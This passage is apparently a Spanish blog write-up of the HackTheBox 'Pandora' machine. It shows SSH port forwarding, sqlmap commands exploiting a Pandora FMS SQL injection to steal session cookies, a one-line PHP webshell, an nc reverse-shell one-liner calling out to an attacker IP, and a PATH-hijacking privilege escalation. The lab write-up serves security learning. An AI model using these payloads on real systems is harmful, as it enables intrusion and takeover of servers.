+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ssh daniel@panda.htb /<span class="k">*</span> HotelBabylon23 <span class="k">*</span>/
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/ssh.png" alt="ssh connect" data-proofer-ignore>
+Estamos dentro ;).
+<br />
+Ahora a enumerar un poco el sistema.
+<img data-src="/assets/img/Images-Post-Pandora/matt.png" alt="MATT User" data-proofer-ignore>
+Vemos que hay otro usuario llamado Matt.
+Al ingresar al directorio del usuario Matt vemos que está el flag, pero lamentablemente no tenemos permisos de lectura ni escritura.
+<img data-src="/assets/img/Images-Post-Pandora/permisos.png" alt="Flag Matt" data-proofer-ignore>
+Al listar el directorio /var/www/ vemos que está el sitio web estático y hay una aplicación web que no tenemos acceso.
+<img data-src="/assets/img/Images-Post-Pandora/varwww.png" alt="www" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/pandora-www.png" alt="pandora sistema" data-proofer-ignore>
+También está corriendo el servicio MySQL.
+Podemos saber esto de dos formas viendo que servicios están en escucha y ver si el demonio de MySQL está corriendo.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>netstat <span class="nt">-lt</span> /<span class="k">*</span> <span class="nt">-l</span>:escuha y <span class="nt">-t</span>:TCP <span class="k">*</span>/
+systemctl status mysql
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/mysql.png" alt="mysql serice" data-proofer-ignore>
+Entonces con esta información recopilada estamos seguro de que los tiros van con la aplicación web.</p>
+<h3 id="local-port-forwarding"><span class="mr-2">Local Port Forwarding</span><a href="#local-port-forwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Para poder acceder a la aplicación web vamos a emplear una técnica de pivoting que se conoce como Local port forwarding.</p>
+<blockquote>
+  <p>No es más que traer los servicios que corren en los diferentes puertos de la máquina objetiva a nuestra máquina y así poder acceder a ellos, ya que esos servicios son internos y no están expuestos.</p>
+  <div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 1313:localhost:80 daniel@panda.htb /<span class="k">*</span> :tu_puerto:localhost:puerto-de-la-máquina host-remoto <span class="k">*</span>/
+</pre></td></tr></tbody></table></code></div>  </div>
+  <p><img data-src="/assets/img/Images-Post-Pandora/localport.png" alt="local port" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/lsof.png" alt="lsof" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/curl.png" alt="web server" data-proofer-ignore></p>
+</blockquote>
+<hr />
+
+<h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<p>Bueno, ya tendríamos acceso a la aplicación web, toca buscar algún <a href="https://es.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a> que afecte a la versión de <a href="https://pandorafms.com/es/">Pandora FMS</a>.
+<img data-src="/assets/img/Images-Post-Pandora/pandoraweb.png" alt="Pandora web" data-proofer-ignore>
+Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versión está con parches.</p>
+<blockquote>
+  <p>Busquemos “pandora v7 742 CVE”. Nos encontramos un <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">blog</a> bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versión de Pandora FMS.
+<img data-src="/assets/img/Images-Post-Pandora/sonarblog.png" alt="Sonar Blog" data-proofer-ignore>
+Lo que más llama la atención es la SQLI a buscar por el CVE si hay algún tipo de exploit, pero ya con leer un poco el blog (o buscar información en otra parte acerca de la vulnerabilidad) ya podríamos explotar nosotros la vulnerabilidad.
+<img data-src="/assets/img/Images-Post-Pandora/vuln.png" alt="Vulnerable parameter" data-proofer-ignore>
+El fichero <strong>chart_generator.php</strong> contiene el parámetro vulnerable <strong>session_id</strong>.
+<br />
+<img data-src="/assets/img/Images-Post-Pandora/url.png" alt="url web" data-proofer-ignore></p>
+</blockquote>
+
+<h3 id="sqli"><span class="mr-2">SQLI</span><a href="#sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Para explotar la vulnerabilidad de inyección SQL usaré la herramienta <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>, ya que todavía no sé explotar una SQLI manual de manera correcta.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">--url</span> <span class="s2">"http://localhost:1313/pandora_console/include/chart_generator.php?session_id="</span> <span class="nt">--random-agent</span> <span class="nt">-o</span> <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--method</span><span class="o">=</span><span class="s2">"GET"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"jm3i5g44ifdfl3417p9gnh9nur"</span> <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--tamper</span><span class="o">=</span>space2comment <span class="nt">--dbs</span> 
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/sqlmap.png" alt="sqlmap" data-proofer-ignore>
+Ahora nos queda encontrar la tabla que almacena el valor de la cookie con el usuario admin y así poder acceder a la dashboard.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">--url</span> <span class="s2">"http://localhost:1313/pandora_console/include/chart_generator.php?session_id="</span> <span class="nt">--random-agent</span> <span class="nt">-o</span> <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--method</span><span class="o">=</span><span class="s2">"GET"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"jm3i5g44ifdfl3417p9gnh9nur"</span> <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> pandora <span class="nt">--tables</span>
+
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/tablas.png" alt="Tablas Pandora" data-proofer-ignore>
+Bastantes, tablas, ja, ja, ja. Luego de estar un buen ratito buscando la tabla correcta, la que más llama la atención es <strong>tsessions_php</strong>.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">--url</span> <span class="s2">"http://localhost:1313/pandora_console/include/chart_generator.php?session_id="</span> <span class="nt">--random-agent</span> <span class="nt">-o</span> <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--method</span><span class="o">=</span><span class="s2">"GET"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"jm3i5g44ifdfl3417p9gnh9nur"</span> <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> pandora <span class="nt">-T</span> tsessions_php <span class="nt">--dump</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/tables.png" alt="tsessions table" data-proofer-ignore>
+Bueno, ahora solo hay que encontrar el valor de la cookie correcto (PHPSESSID) y así poder hacer un robo de sesión.
+<img data-src="/assets/img/Images-Post-Pandora/cookievalida.png" alt="cookie valida" data-proofer-ignore>
+Para cambiar el valor de la cookie hay dos formas de hacerlo con una extensión en tu navegador web o desde las mismas herramientas de desarrollador.
+<img data-src="/assets/img/Images-Post-Pandora/devtools.png" alt="devtools" data-proofer-ignore>
+Remplazos el valor haciendo doble clic.
+<img data-src="/assets/img/Images-Post-Pandora/devcookie.png" alt="valor cookie" data-proofer-ignore>
+Y listo evadimos el login.
+<img data-src="/assets/img/Images-Post-Pandora/ypadentro.png" alt="dashboard listoo" data-proofer-ignore>
+Ahora solo necesitamos conseguir una Shell y esto lo podríamos hacer subiendo una webshell.
+Pero hay un problema con este usuario, no podemos hacer mucho, ya que no cuenta con los privilegios adecuados, tendremos que conseguir la sesión del admin.</p>
+<blockquote>
+  <p>También en un <a href="https://github.com/ibnuuby/CVE-2021-32099">repo</a> está el <strong>PoC</strong> del <strong>CVE</strong>, donde está la sentencia <strong>SQL maliciosa</strong>, ya que él lo exploto de forma manual..
+<img data-src="/assets/img/Images-Post-Pandora/PoC.png" alt="Manual SQLI" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/urlpayload.png" alt="Payload" data-proofer-ignore>
+Ya estamos como el usuario admin (;.
+<img data-src="/assets/img/Images-Post-Pandora/admindashboard.png" alt="dashboad admin" data-proofer-ignore></p>
+</blockquote>
+
+<h3 id="webshell"><span class="mr-2">WebShell</span><a href="#webshell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Para subir nuestra webshell no vamos al sidebar Admin tools y luego File manager.
+<img data-src="/assets/img/Images-Post-Pandora/filemanager.png" alt="sidebar" data-proofer-ignore></p>
+
+<p>Yo utilizare esta <a href="https://github.com/JohnTroony/php-webshells">webshell</a>.</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/webshelsita.png" alt="webshell code" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/uploadwebshell.png" alt="upload webshell" data-proofer-ignore>
+Listo, ahora nos queda ir al PATH (/pandora_console/images/backgrounds/webshell.php).
+<img data-src="/assets/img/Images-Post-Pandora/rce.png" alt="rce" data-proofer-ignore>
+Ahora que tenemos un <strong>RCE</strong> nos queda entablarnos la <strong>Reverse Shell</strong>.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.121 1212 <span class="o">&gt;</span>/tmp/f
+nc <span class="nt">-lvnp</span> 1212 
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/listen.png" alt="listen" data-proofer-ignore>
+<br />
+Listo obtenemos la Shell ahora a leer el flag y luego el privesc.
+<img data-src="/assets/img/Images-Post-Pandora/reverseshell.png" alt="reverseshell" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/user.png" alt="flag user" data-proofer-ignore>
+<br /></p>
+<hr />
+
+<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<p>Enumerando un poco el sistema no tenemos nada interesante en <strong>crontabs</strong>, grupos pero si en binarios <strong>SUID</strong>.
+<img data-src="/assets/img/Images-Post-Pandora/crontabs.png" alt="crontabs" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/suid.png" alt="SUID Binarie" data-proofer-ignore>
+<br />
+Ese binario no es nada común. 🤔 A ejecutar el binario. 🎉
+<img data-src="/assets/img/Images-Post-Pandora/pandorabackup.png" alt="pandora backup" data-proofer-ignore>
+Lo que más me llama la atención es <strong>tar</strong> y por deducción que trata de descomprimir el fichero comprimido.
+Podríamos subir <a href="https://github.com/DominicBreuker/pspy">pspy</a> para visualizar procesos en tiempo real y ver si obtenemos un poco más de información.
+<img data-src="/assets/img/Images-Post-Pandora/real.png" alt="psyp64" data-proofer-ignore></p>
+<h3 id="path-hijacking"><span class="mr-2">PATH HIJACKING</span><a href="#path-hijacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Con el binario <strong>tar</strong> porque <strong>pandora_backup</strong> lo utiliza.</p>
+<blockquote>
+  <p>El PATH hijacking no es más que engañar de alguna forma el lugar de la ejecución del binario, ya que gracias a la variable de entorno <strong>$PATH</strong> ira viendo si se encuentra el <strong>binario</strong> . 
+<br />Ejemplo más concreto
+Si yo quiero ejecutar el binario passwd ira recorriendo cada ruta de la asignacion de la variable de entorno <strong>$PATH</strong> en busca de ese binario
+Yo puedo engañar para que se ejecute el binario malicioso antes y no el binario legítimo. <br /> 
+<img data-src="/assets/img/Images-Post-Pandora/passwd.png" alt="passwd" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/explicacionpath.png" alt="explicacion" data-proofer-ignore><br />
+Para simular el binario <strong>tar</strong> lo haré con el lenguaje de programación <strong>C</strong> (algo simple).
+<img data-src="/assets/img/Images-Post-Pandora/code.png" alt="code C" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/transferencia.png" alt="en maquina" data-proofer-ignore>
+Ahora a la acción. 💣</p>
+</blockquote>
+
+<h3 id="poc"><span class="mr-2">PoC</span><a href="#poc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Ja, ja, ja, un épico fail.
+<img data-src="/assets/img/Images-Post-Pandora/fail.png" alt="FAIl" data-proofer-ignore>
+Probaré conectándome a través de <strong>SSH</strong> al usuario <strong>Matt</strong> , ya que por alguna razón no me da la Shell como root.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> <span class="nb">tar</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="nb">tar</span> <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="nb">tar</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$PATH</span> <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span> <span class="o">&amp;&amp;</span> /usr/bin/pandora_backup
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/root.png" alt="root" data-proofer-ignore>
+¡Listo!, al final explotamos de una manera diferente como quería yo (por problemas de librerías que no tenía instalada la máquina), pero es lo mismo.</p>
+
+<p><img data-src="/assets/img/Images-Post-Pandora/flagroot.png" alt="flag root" data-proofer-ignore></p>
+<hr />
+
+<h2 id="fin"><span class="mr-2">Fin</span><a href="#fin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<p>Disculpad si está mal redactado o errores de escritura y si me he equivocado en algún concepto/termino.</p>
+<blockquote>
+  <h3 id="gracias-a"><span class="mr-2">Gracias a</span><a href="#gracias-a" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+  <p><a href="https://guglia001.github.io/">Mario Guglia</a> porque me ayudo con la máquina cuando había salido, ya que quede stuck y a <a href="https://s4ori.tk/">s4ori</a> que me explico acerca del Local port forwading porque no sabía sobre esta técnica.</p>
+</blockquote>
+
+<p>Cualquier feedback es bienvenido me pueden contactar
+por <a href="https://twitter.com/T3_6_9">Twitter</a> y <a href="https://t.me/T3_6_9">Telegram</a>.</p>
+
+</div>
+
+<div class="post-tail-wrapper text-muted">
+
+  <!-- categories -->
+  
+  <div class="post-meta mb-3">
+    <i class="far fa-folder-open fa-fw mr-1"></i>
+    
+      <a href='/categories/htb/'>HTB</a>
+  </div>
+  
+
+  <!-- tags -->
+  
+  <div class="post-tags">
+    <i class="fa fa-tags fa-fw mr-1"></i>
+      
+      <a href="/tags/hackthebox/"
+          class="post-tag no-text-decoration" >HackTheBox</a>
+      
+      <a href="/tags/writeup/"
+          class="post-tag no-text-decoration" >Writeup</a>
+      
+      <a href="/tags/sqli/"
+          class="post-tag no-text-decoration" >SQLI</a>
+      
+      <a href="/tags/localportforwarding/"
+          class="post-tag no-text-decoration" >LocalPortForwarding</a>
+      
+      <a href="/tags/path-hijacking/"
+          class="post-tag no-text-decoration" >PATH-Hijacking</a>
+      
+      <a href="/tags/udp/"
+          class="post-tag no-text-decoration" >UDP</a>
+      
+      <a href="/tags/snmp/"
+          class="post-tag no-text-decoration" >snmp</a>
+      
+      <a href="/tags/2022/"
+          class="post-tag no-text-decoration" >2022</a>
+      
+  </div>
+  
+
+  <div class="post-tail-bottom
+    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+    <div class="license-wrapper">
+
+      
+
+        
+
+        This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+
+      
+    </div>
+
+    <!--
+ Post sharing snippet
+-->
+
+<div class="share-wrapper">
+  <span class="share-label text-muted mr-1">Share</span>
+  <span class="share-icons">
+    
+    
+
+    
+      
+        <a href="https://twitter.com/intent/tweet?text=Pandora HackTheBox - T3sla&amp;url=/posts/pandora-hackthebox/" data-toggle="tooltip" data-placement="top"
+          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
+          <i class="fa-fw fab fa-twitter"></i>
+        </a>
+    
+      
+        <a href="https://www.facebook.com/sharer/sharer.php?title=Pandora HackTheBox - T3sla&amp;u=/posts/pandora-hackthebox/" data-toggle="tooltip" data-placement="top"
+          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
+          <i class="fa-fw fab fa-facebook-square"></i>
+        </a>
+    
+      
+        <a href="https://t.me/share/url?url=/posts/pandora-hackthebox/&amp;text=Pandora HackTheBox - T3sla" data-toggle="tooltip" data-placement="top"
+          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
+          <i class="fa-fw fab fa-telegram"></i>
+        </a>
+    
+
+    <i id="copy-link" class="fa-fw fas fa-link small"
+        data-toggle="tooltip" data-placement="top"
+        title="Copy link"
+        data-title-succeed="Link copied successfully!">
+    </i>
+
+  </span>
+</div>
+
+
+  </div><!-- .post-tail-bottom -->
+
+</div><!-- div.post-tail-wrapper -->
+
+
+      
+    
+    
+
+    </div>
+  </div> <!-- #core-wrapper -->
+
+  <!-- pannel -->
+  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">
+
+    <div class="access">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <div id="access-tags">
+    <div class="panel-heading">Trending Tags</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+
+    
+      
+      <a class="post-tag" href="/tags/2022/">2022</a>
+    
+      
+      <a class="post-tag" href="/tags/t3sla/">T3sla</a>
+    
+      
+      <a class="post-tag" href="/tags/ciberseguridad/">Ciberseguridad</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/holamundo/">HolaMundo</a>
+    
+      
+      <a class="post-tag" href="/tags/localportforwarding/">LocalPortForwarding</a>
+    
+      
+      <a class="post-tag" href="/tags/noob/">NOOB</a>
+    
+      
+      <a class="post-tag" href="/tags/path-hijacking/">PATH-Hijacking</a>
+    
+      
+      <a class="post-tag" href="/tags/snmp/">snmp</a>
+    
+      
+      <a class="post-tag" href="/tags/sqli/">SQLI</a>
+    
+
+    </div>
+  </div>
+
+
+    </div>
+
+    
+      
+      
+
+
+
+<!-- BS-toc.js will be loaded at medium priority -->
+<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
+  <nav id="toc" data-toggle="toc"></nav>
+</div>
+
+
+    
+  </div>
+
+</div>
+
+<!-- tail -->
+
+<div class="row">
+  <div class="col-12 col-lg-11 col-xl-8">
+    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+      
+        
+        <!--
+ Recommend the other 3 posts according to the tags and categories of the current post,
+ if the number is not enough, use the other latest posts to supplement.
+-->
+
+<!-- The total size of related posts  -->
+
+
+<!-- An random integer that bigger than 0  -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->
+
+
+
+
+
+
+
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+<!-- Fill with the other newlest posts  -->
+
+
+
+
+
+
+  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
+    <h3 class="pt-2 mt-1 mb-4 ml-1"
+      data-toc-skip>Further Reading</h3>
+    <div class="card-deck mb-4">
+    
+      
+      
+      <div class="card">
+        <a href="/posts/hola-mundo/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1645552500"
+    
+    >
+  2022-02-22
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hola Mundo</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Hola a todos este es mi primer post, trataré de explicar de que tratara este blog.
+
+¿Qué encontrarás en este blog?
+
+
+  Hacking.
+  Diferentes plataformas de Ciberseguridad.
+  El lenguaje de programa...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/recursos-ciberseguridad/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1645583460"
+    
+    >
+  2022-02-22
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Recursos de Ciberseguridad</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Bienvenidos/as
+Este post tratará de los mejores canales, blogs y apuntes de Ciberseguridad (a mi parecer, claro- que no son todos, pero son algunos que me ayudan mucho, no están ordenados en plan c...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/descargar-videos-de-udemy/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1649337900"
+    
+    >
+  2022-04-07
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Descargar videos de Udemy</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Bienvenidos/a
+Este artículo (post) tratará de como descargar los videos de Udemy.
+Herramientas
+Herramientas que vamos a emplear.
+
+  Navegador Web, en mi caso usaré el navegador web Google Chrome.
+T...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+    </div> <!-- .card-deck -->
+  </div> <!-- #related-posts -->
+
+
+      
+        
+        <!--
+  Navigation buttons at the bottom of the post.
+-->
+
+<div class="post-navigation d-flex justify-content-between">
+  
+  <a href="/posts/descargar-videos-de-udemy/" class="btn btn-outline-primary"
+    prompt="Older">
+    <p>Descargar videos de Udemy</p>
+  </a>
+  
+
+  
+  <span class="btn btn-outline-primary disabled"
+    prompt="Newer">
+    <p>-</p>
+  </span>
+  
+
+</div>
+
+      
+        
+        <!--  The comments switcher -->
+
+
+      
+    </div>
+  </div>
+</div> <!-- .row -->
+
+
+
+        <!--
+  The Footer
+-->
+
+<footer class="d-flex w-100 justify-content-center">
+  <div class="d-flex justify-content-between align-items-center text-muted">
+    <div class="footer-left">
+      <p class="mb-0">
+        © 2022
+        <a href="https://twitter.com/username">T3sla</a>.
+        
+        <span data-toggle="tooltip" data-placement="top"
+          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
+        
+      </p>
+    </div>
+
+    <div class="footer-right">
+      <p class="mb-0">
+        
+
+        
+
+        Powered by 
+          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
+         with 
+          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
+         theme.
+
+      </p>
+    </div>
+
+  </div> <!-- div.d-flex -->
+</footer>
+
+
+      </div>
+
+      <!--
+  The Search results
+-->
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
+  <div class="col-12 col-sm-11 post-content">
+    <div id="search-hints">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
